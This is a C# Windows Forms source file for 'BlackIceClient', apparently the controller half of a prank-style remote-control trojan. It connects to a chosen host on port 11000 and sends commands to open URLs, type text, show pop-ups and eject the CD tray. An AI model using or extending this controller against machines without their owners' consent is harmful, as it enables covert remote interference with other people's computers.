using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackIceClient
{
    public partial class BlackIce : Form
    {
        Socket m_sender;

        public BlackIce()
        {
            InitializeComponent();
        }

        private void hackBlackIce_Click(object sender, EventArgs e)
        {
            // Connect to a remote device.
            try
            {
                // Establish the remote endpoint for the socket.
                // This example uses port 11000 on the local computer.
                IPHostEntry ipHostInfo = Dns.GetHostByName(ipTextBox.Text);
                IPAddress ipAddress = ipHostInfo.AddressList[0];
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);

                // Create a TCP/IP  socket.
                m_sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                // Connect the socket to the remote endpoint. Catch any errors.
                try
                {
                    m_sender.Connect(remoteEP);
                }
                catch (ArgumentNullException ane)
                {
                    MessageBox.Show("ArgumentNullException : {0}", ane.ToString());
                }
                catch (SocketException se)
                {
                    MessageBox.Show("SocketException : {0}", se.ToString());
                }
                catch (Exception E)
                {
                    MessageBox.Show("Unexpected exception : {0}", E.ToString());
                }

            }
            catch (Exception E)
            {
                MessageBox.Show("{0}", E.ToString());
            }
        }


        private void openBrowser_Click(object sender, EventArgs e)
        {
            String sMessage = "URL<@>" + urlTextBox.Text;
            SendThread(sMessage);            
        }

        private void writeGhost_Click(object sender, EventArgs e)
        {
            String sMessage = "Ghost<@>" + ghostTypeBox.Text;
            SendThread(sMessage); 
        }

        private void popMessage_Click(object sender, EventArgs e)
        {
            String sMessage = "Pop<@>" + popTextbox.Text;
            SendThread(sMessage); 
        }

        private void SendThread(string Message)
        {
            // Encode the data string into a byte array.
            byte[] msg = Encoding.ASCII.GetBytes(Message);

            // Send the data through the socket.
            int bytesSent = m_sender.Send(msg);
        }

        private void BlackIce_FormClosing(Object sender, FormClosingEventArgs e)
        {
            // Release the socket.
            m_sender.Shutdown(SocketShutdown.Both);
            m_sender.Close();
        }

        private void ejectRom_Click(object sender, EventArgs e)
        {
            String sMessage = "ROM<@>" + "Eject";
            SendThread(sMessage); 
        }

        private void closeRom_Click(object sender, EventArgs e)
        {
            String sMessage = "ROM<@>" + "Close";
            SendThread(sMessage); 
        }

        private void terminateBtn_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void sketchBtn_Click(object sender, EventArgs e)
        {
            String sMessage = "Sketch<@>" + sketchTextBox.Text;
            SendThread(sMessage); 
        }

        private void enterBtn_Click(object sender, EventArgs e)
        {
            SendThread("Matrix<@>");
        }

        private void changeBtn_Click(object sender, EventArgs e)
        {
            SendThread("Change<@>");
        }

        private void jabBtn_Click(object sender, EventArgs e)
        {
            SendThread("Jab<@>");
        }

    }
}
